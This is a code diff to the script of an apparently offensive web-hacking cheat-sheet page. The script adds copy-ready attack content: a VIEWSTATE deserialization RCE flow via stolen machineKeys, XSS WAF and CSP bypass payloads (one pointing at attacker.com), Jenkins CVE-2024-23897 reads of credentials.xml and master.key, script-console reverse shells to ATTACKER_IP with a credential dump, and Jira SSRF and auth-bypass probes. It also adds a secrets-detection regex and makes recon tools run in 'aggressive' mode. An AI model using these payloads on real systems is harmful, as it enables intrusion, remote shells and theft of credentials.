@@ -22,18 +22,18 @@ function storeOriginalCode() {
 function applyTargetToCommands(targetValue, targetType) {
   const isBulk = (targetType === 'wildcard');
   // Tools whose flags should be transformed in wildcard/list mode
-  const transformTools = ['subfinder','amass','nuclei','assetfinder','ffuf','httpx','subjack','subzy'];
+  const transformTools = ['subfinder','amass','nuclei','assetfinder','ffuf','httpx','subjack','subzy','dnscan','dirsearch','gau','waymore'];
   // System utilities whose flags must NEVER be touched
   const excludedTools = ['sort','uniq','grep','sed','awk','cat','jq','prips','dig','masscan'];
 
   originalCodeContents.forEach((original, codeEl) => {
     let text = original;
-    // Replace domain/host placeholders with targetValue
-    text = text.replace(/\b(?:example|site|Target)\.com\b/gi, targetValue);
+    // Replace domain/host placeholders with targetValue (including inside URLs)
+    text = text.replace(/(?:example|site|Target)\.com/gi, targetValue);
 
     if (isBulk) {
       // Handle special subfinder pipe pattern first (line-level)
-      text = text.replace(/echo\s+["']?[^"'\n|]+["']?\s*\|\s*subfinder\b/g, 'subfinder -dL target_file');
+      text = text.replace(/echo\s+["']?[^"'\n|]+["']?\s*\|\s*subfinder\b/g, 'subfinder -dL ' + targetValue);
 
       // Process line by line for context-aware flag transformation
       text = text.split('\n').map(line => {
@@ -441,10 +441,305 @@ function cleanupUI() {
   }
 }
 
+// ==================== Content Injection Helpers ====================
+function createSubsection(title) {
+  const div = document.createElement('div');
+  div.className = 'subsection';
+  const h = document.createElement('div');
+  h.className = 'subsection-title';
+  h.textContent = title;
+  div.appendChild(h);
+  return div;
+}
+function createCodeBlock(lang, code) {
+  const wrapper = document.createElement('div');
+  wrapper.className = 'code-block-wrapper';
+  const header = document.createElement('div');
+  header.className = 'code-header';
+  const langSpan = document.createElement('span');
+  langSpan.className = 'code-lang';
+  langSpan.textContent = lang;
+  const copyBtn = document.createElement('button');
+  copyBtn.className = 'copy-btn';
+  header.appendChild(langSpan);
+  header.appendChild(copyBtn);
+  const pre = document.createElement('pre');
+  const codeEl = document.createElement('code');
+  codeEl.textContent = code;
+  pre.appendChild(codeEl);
+  wrapper.appendChild(header);
+  wrapper.appendChild(pre);
+  return wrapper;
+}
+
+// ==================== Aggressive Tool Optimization (Task 4) ====================
+function upgradeToolCommands() {
+  document.querySelectorAll('pre code').forEach(codeEl => {
+    let t = codeEl.textContent;
+    // Subfinder: upgrade basic pipe usage to aggressive mode
+    t = t.replace(
+      /echo\s+["']?site\.com["']?\s*\|\s*subfinder/g,
+      'subfinder -d example.com -all -recursive -silent -o subs.txt'
+    );
+    // Amass enum: add -active -brute if not already present (line-by-line)
+    t = t.split('\n').map(function(line) {
+      if (/amass\s+enum\b/.test(line)) {
+        if (!/\s-active\b/.test(line)) {
+          line = line.replace(/amass\s+enum/, 'amass enum -active');
+        }
+        if (!/\s-brute\b/.test(line)) {
+          line = line.replace(/amass\s+enum(?:\s+-active)?/, '$& -brute');
+        }
+      }
+      // Amass intel: add -active if not present
+      if (/amass\s+intel\b/.test(line) && !/\s-active\b/.test(line)) {
+        line = line.replace(/amass\s+intel/, 'amass intel -active');
+      }
+      return line;
+    }).join('\n');
+    codeEl.textContent = t;
+  });
+}
+
+// ==================== Content Migration (Task 5) ====================
+function injectMigratedContent() {
+  // --- Sec 06 (Burp): Add massive keys/tokens regex ---
+  const sec6 = document.getElementById('sec-6');
+  if (sec6) {
+    const body = sec6.querySelector('.section-body');
+    if (body) {
+      const sub = createSubsection('Extended Secrets & Tokens Detection Regex');
+      sub.appendChild(createCodeBlock('regex',
+        '(?i)(' +
+        'access_key|access_token|admin_pass|admin_user|algolia_admin_key|algolia_api_key|' +
+        'alias_pass|alicloud_access_key|amazon_secret_access_key|amazonaws|ansible_vault_password|' +
+        'aos_key|api_key|api_key_secret|api_key_sid|api_secret|apidocs|apikey|apiSecret|' +
+        'app_debug|app_id|app_key|app_log_level|app_secret|appkey|appkeysecret|' +
+        'application_key|appsecret|appspot|auth_token|authorizationToken|authsecret|' +
+        'aws_access|aws_access_key_id|aws_bucket|aws_key|aws_secret|aws_secret_key|' +
+        'aws_token|AWSSecretKey|b2_app_key|bashrc password|bintray_apikey|bintray_gpg_password|' +
+        'bintray_key|bintraykey|bluemix_api_key|bluemix_pass|browserstack_access_key|' +
+        'bucket_password|bucketeer_aws_access_key_id|bucketeer_aws_secret_access_key|' +
+        'built_branch_deploy_key|bx_password|cache_driver|cache_s3_secret_key|cattle_access_key|' +
+        'cattle_secret_key|certificate_password|ci_deploy_password|client_secret|' +
+        'client_zpk_secret_key|clojars_password|cloud_api_key|cloud_watch_aws_access_key|' +
+        'cloudant_password|cloudflare_api_key|cloudflare_auth_key|cloudinary_api_secret|' +
+        'cloudinary_name|codecov_token|config|conn.login|connectionstring|consumer_key|' +
+        'consumer_secret|credentials|cypress_record_key|database_password|database_schema_test|' +
+        'datadog_api_key|datadog_app_key|db_password|db_server|db_username|dbpasswd|' +
+        'dbpassword|dbuser|deploy_password|digitalocean_ssh_key_body|digitalocean_ssh_key_ids|' +
+        'docker_hub_password|docker_key|docker_pass|docker_passwd|docker_password|' +
+        'dockerhub_password|dockerhubpassword|dot-hierarchical-password|dotfiles_hierarchical_password|' +
+        'droplet_travis_password|dynamoaccesskeyid|dynamosecretaccesskey|elastica_host|' +
+        'elasticsearch_password|encryption_key|encryption_password|env.hierarchical_password|' +
+        'env.ICLOUD_CONTAINER|eureka.hierarchical_password|facebook_secret|firebase_api_token|' +
+        'firebase_key|firebase_token|fossa_api_key|ftp_password|gh_token|ghost_api_key|' +
+        'github_api_key|github_deploy_hb_doc_pass|github_key|github_token|gitlab_user_email|' +
+        'google_api|google_cloud|google_maps_api_key|google_private_key|gpg_key_name|' +
+        'gpg_keyname|gpg_passphrase|gradle_signing_key_id|gradle_signing_password|' +
+        'heroku_api_key|heroku_api_user|heroku_email|heroku_token|' +
+        'HOMEBREW_GITHUB_API_TOKEN|hub_dxia2_password|jwt_secret|jwt_token|' +
+        'ldap_password|ldap_username|linux_signing_key|mailchimp_api_key|mailchimp_key|' +
+        'mailgun_api_key|mailgun_key|mailgun_secret_api_key|master_key|' +
+        'mysql_password|mysql_root_password|nexus_password|node_env|npm_api_key|' +
+        'npm_secret_key|npm_token|nuget_api_key|oauth_token|' +
+        'okta_client_token|openwhisk_key|org_gradle_project_signing_key|' +
+        'org_project_gradle_sonatype_nexus_password|os_password|ossrh_jira_password|' +
+        'ossrh_pass|pagerduty_apikey|papertrail_api_token|parse_js_key|' +
+        'paypal_secret|personal_key|plotly_apikey|postgresql_pass|' +
+        'private_key|private_signing_password|prod.access_key_id|prod.exs|prod.secret_key_base|' +
+        'pypi_passowrd|quip_token|rabbit_password|rds_password|redis_password|' +
+        'registry_secure|rest_api_key|s3_access_key|s3_bucket|s3_endpoint|s3_key|' +
+        's3_secret_access_key|salesforce_bulk_test_password|' +
+        'secret_access_key|secret_key|secret_key_base|secretaccesskey|secretkey|' +
+        'sentry_auth_token|sentry_default_org|sentry_key|setdstaccesskey|' +
+        'sf_username|signing_key|signing_key_password|slack_api|slack_channel|slack_key|' +
+        'slack_outgoing_token|slack_signing_secret|slack_token|slack_url|slack_webhook|' +
+        'slack_webhook_url|smokecustomersecret|smtp_password|sonar_organization_key|' +
+        'sonar_project_key|sonar_token|sonarcloud_api_token|sonatype_password|' +
+        'soundcloud_client_secret|sshkey|stripe_key|stripe_secret|surge_login|surge_token|' +
+        'svn_pass|tester_keys_password|token|travis_branch|travis_token|twilio_account_id|' +
+        'twilio_account_secret|twilio_account_sid|twilio_api|twilio_api_key|' +
+        'twilio_api_secret|twilio_token|twine_password|vault_password|' +
+        'webhook_url|wordpress_password|zen_api_token|zendesk_api_token' +
+        ')\\s*[=:]\\s*[\'"]?[a-zA-Z0-9_\\-\\.+\\/]{8,}[\'"]?'
+      ));
+      body.appendChild(sub);
+    }
+  }
+
+  // --- Sec 11 (IIS): Add web.config/machinekey RCE flow ---
+  const sec11 = document.getElementById('sec-11');
+  if (sec11) {
+    const body = sec11.querySelector('.section-body');
+    if (body) {
+      const sub = createSubsection('MachineKey Extraction & VIEWSTATE RCE Flow');
+      sub.appendChild(createCodeBlock('bash',
+        '# Step 1: Extract web.config via path traversal or LFI\n' +
+        'curl https://example.com/..;/web.config\n' +
+        'curl "https://example.com/download?file=../web.config"\n\n' +
+        '# Step 2: Extract machineKey from web.config\n' +
+        '# Look for: <machineKey validationKey="..." decryptionKey="..." />\n\n' +
+        '# Step 3: Generate malicious VIEWSTATE with ysoserial.net\n' +
+        'ysoserial.exe -p ViewState -g TextFormattingRunProperties \\\n' +
+        '  -c "powershell -e JABjAGwAaQBlAG4AdAA..." \\\n' +
+        '  --path="/vulnerable.aspx" --apppath="/" \\\n' +
+        '  --decryptionalg="AES" --decryptionkey="DECRYPTION_KEY_HERE" \\\n' +
+        '  --validationalg="SHA1" --validationkey="VALIDATION_KEY_HERE"\n\n' +
+        '# Step 4: Send the payload\n' +
+        'curl -X POST "https://example.com/vulnerable.aspx" \\\n' +
+        '  --data-urlencode "__VIEWSTATE=GENERATED_PAYLOAD"\n\n' +
+        '# Alternative: Use Blacklist3r to decrypt existing VIEWSTATE\n' +
+        '# https://github.com/NotSoSecure/Blacklist3r\n' +
+        'AspDotNetWrapper.exe --keypath MachineKeys.txt \\\n' +
+        '  --encrypteddata "VIEWSTATE_VALUE" --purpose=viewstate \\\n' +
+        '  --modifier=CA0B0334 --macdecode'
+      ));
+      body.appendChild(sub);
+    }
+  }
+
+  // --- Sec 14 (XSS/CSP): Add Cloudflare bypass vectors and Polyglot PDF CSP bypass ---
+  const sec14 = document.getElementById('sec-14');
+  if (sec14) {
+    const body = sec14.querySelector('.section-body');
+    if (body) {
+      const sub1 = createSubsection('Cloudflare XSS Bypass Vectors');
+      sub1.appendChild(createCodeBlock('html',
+        '<svg onload=alert(1)//\n' +
+        '<svg/onload=&#97&#108&#101&#114&#116(1)>\n' +
+        '<a"/onclick=(confirm)()>click\n' +
+        '<svg/onload=self[`aler`%2b`t`](1)>\n' +
+        '<svg::::onload=alert(1)>\n' +
+        '<math><mtext><table><mglyph><style><!--</style><img title="--><img src=x onerror=alert(1)//">\n' +
+        '<input onfocus=alert(1) autofocus>\n' +
+        '<select onfocus=alert(1) autofocus>\n' +
+        '<textarea onfocus=alert(1) autofocus>\n' +
+        '<video><source onerror=alert(1)>\n' +
+        '<marquee onstart=alert(1)>\n' +
+        '<details open ontoggle=alert(1)>\n' +
+        '"><img src=x onerror=alert(String.fromCharCode(88,83,83))>\n' +
+        '<img src=x onerror=eval(atob("YWxlcnQoMSk="))>'
+      ));
+      body.appendChild(sub1);
+
+      const sub2 = createSubsection('Polyglot PDF & CSP Bypass');
+      sub2.appendChild(createCodeBlock('text',
+        '# Polyglot PDF XSS (valid PDF + embedded JS)\n' +
+        '# Upload as .pdf, served with application/pdf MIME\n' +
+        '# Bypasses CSP when PDF viewer executes embedded JS\n\n' +
+        '%PDF-1.4\n' +
+        '1 0 obj<</Pages 2 0 R>>endobj\n' +
+        '2 0 obj<</Kids[3 0 R]/Count 1>>endobj\n' +
+        '3 0 obj<</AA<</O<</JS(app.alert(1))/S/JavaScript>>>>/Parent 2 0 R>>endobj\n' +
+        'trailer<</Root 1 0 R>>\n\n' +
+        '# CSP Bypass via base-uri\n' +
+        '<base href="https://attacker.com/">\n' +
+        '# Then relative script paths load from attacker domain\n\n' +
+        '# CSP Bypass via meta refresh\n' +
+        '<meta http-equiv="refresh" content="0;url=data:text/html,<script>alert(1)</script>">\n\n' +
+        '# CSP Bypass via JSONP endpoints on whitelisted domains\n' +
+        '<script src="https://accounts.google.com/o/oauth2/revoke?callback=alert(1)"></script>\n' +
+        '<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.6.0/angular.min.js"></script>\n' +
+        '<div ng-app ng-csp>{{$eval.constructor(\'alert(1)\')()}}</div>\n\n' +
+        '# CSP Bypass via object-src\n' +
+        '<object data="data:text/html,<script>alert(1)</script>">\n\n' +
+        '# CSP Bypass via trusted types & DOM clobbering\n' +
+        '<form><math><mtext></form><form><mglyph><style></math>' +
+        '<img src onerror=alert(1)>'
+      ));
+      body.appendChild(sub2);
+    }
+  }
+
+  // --- Sec 36 (Jenkins/Jira): Add CVE-2024-23897 details and RCE via script console ---
+  const sec36 = document.getElementById('sec-36');
+  if (sec36) {
+    const body = sec36.querySelector('.section-body');
+    if (body) {
+      const sub1 = createSubsection('Jenkins CVE-2024-23897 — Arbitrary File Read via CLI');
+      sub1.appendChild(createCodeBlock('bash',
+        '# CVE-2024-23897 - Jenkins CLI arbitrary file read\n' +
+        '# Affects Jenkins <= 2.441 and LTS <= 2.426.2\n' +
+        '# The CLI uses args4j which expands @filename to file contents\n\n' +
+        '# Download jenkins-cli.jar from target\n' +
+        'wget http://jenkins.example.com:8080/jnlpJars/jenkins-cli.jar\n\n' +
+        '# Read /etc/passwd (classic check)\n' +
+        'java -jar jenkins-cli.jar -s http://jenkins.example.com:8080/ help "@/etc/passwd"\n\n' +
+        '# Read credentials.xml for stored secrets\n' +
+        'java -jar jenkins-cli.jar -s http://jenkins.example.com:8080/ help "@/var/jenkins_home/credentials.xml"\n\n' +
+        '# Read master.key and hudson.util.Secret for decryption\n' +
+        'java -jar jenkins-cli.jar -s http://jenkins.example.com:8080/ connect-node "@/var/jenkins_home/secrets/master.key"\n\n' +
+        '# Alternative: use who-am-i for 1-line output\n' +
+        'java -jar jenkins-cli.jar -s http://jenkins.example.com:8080/ who-am-i "@/etc/hostname"\n\n' +
+        '# Automated scanner:\n' +
+        '# https://github.com/h4x0r-dz/CVE-2024-23897\n' +
+        'python3 CVE-2024-23897.py -u http://jenkins.example.com:8080/'
+      ));
+      body.appendChild(sub1);
+
+      const sub2 = createSubsection('Jenkins Script Console RCE');
+      sub2.appendChild(createCodeBlock('groovy',
+        '// Jenkins Script Console — /script endpoint\n' +
+        '// Requires admin or script permissions\n\n' +
+        '// Command execution\n' +
+        'println "id".execute().text\n' +
+        'println "whoami".execute().text\n' +
+        'println "cat /etc/passwd".execute().text\n\n' +
+        '// Reverse shell (Bash)\n' +
+        'def cmd = "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"\n' +
+        '["bash", "-c", cmd].execute()\n\n' +
+        '// Reverse shell (Python)\n' +
+        'def cmd2 = \'python3 -c "import socket,subprocess,os;' +
+        's=socket.socket(socket.AF_INET,socket.SOCK_STREAM);' +
+        's.connect((\\\'ATTACKER_IP\\\',4444));' +
+        'os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);' +
+        'subprocess.call([\\\'/bin/bash\\\',\\\'-i\\\'])"\'\n' +
+        '["bash", "-c", cmd2].execute()\n\n' +
+        '// Read file\n' +
+        'new File("/etc/passwd").text\n\n' +
+        '// List environment variables\n' +
+        'System.getenv().each { k, v -> println "${k}=${v}" }\n\n' +
+        '// Dump all credentials\n' +
+        'com.cloudbees.plugins.credentials.CredentialsProvider.lookupCredentials(\n' +
+        '  com.cloudbees.plugins.credentials.common.StandardUsernamePasswordCredentials.class,\n' +
+        '  jenkins.model.Jenkins.instance, null, null\n' +
+        ').each { println "id: ${it.id}, user: ${it.username}, pass: ${it.password}" }'
+      ));
+      body.appendChild(sub2);
+
+      const sub3 = createSubsection('Jira Advanced Exploitation');
+      sub3.appendChild(createCodeBlock('bash',
+        '# CVE-2019-8451 - SSRF via gadgets/makeRequest\n' +
+        'curl "https://jira.example.com/plugins/servlet/gadgets/makeRequest?url=http://169.254.169.254/latest/meta-data/"\n\n' +
+        '# CVE-2020-14179 - Information Disclosure\n' +
+        'curl "https://jira.example.com/secure/QueryComponent!Default.jspa"\n\n' +
+        '# CVE-2020-14181 - User Enumeration\n' +
+        'curl "https://jira.example.com/secure/ViewUserHover.jspa?username=admin"\n\n' +
+        '# CVE-2022-0540 - Authentication Bypass (Seraph)\n' +
+        'curl "https://jira.example.com/InsightPluginShowGeneralConfiguration.jspa;"\n\n' +
+        '# Unauthenticated dashboard access\n' +
+        'curl "https://jira.example.com/rest/api/2/dashboard?maxResults=100"\n\n' +
+        '# Project & user enumeration\n' +
+        'curl "https://jira.example.com/rest/api/2/project"\n' +
+        'curl "https://jira.example.com/rest/api/2/user/picker?query=a"\n' +
+        'curl "https://jira.example.com/rest/api/2/groupuserpicker?query=admin&maxResults=50"\n\n' +
+        '# Jira-Lens automated scanning\n' +
+        'python3 jira-lens.py -u https://jira.example.com'
+      ));
+      body.appendChild(sub3);
+    }
+  }
+}
+
 // ==================== Init ====================
 document.addEventListener('DOMContentLoaded', () => {
   // --- UI Cleanup: remove global search, file upload, simplify select ---
   cleanupUI();
+
+  // --- Aggressive Tool Optimization & Content Migration (before storing originals) ---
+  upgradeToolCommands();
+  injectMigratedContent();
 
   initCopyButtons();
 
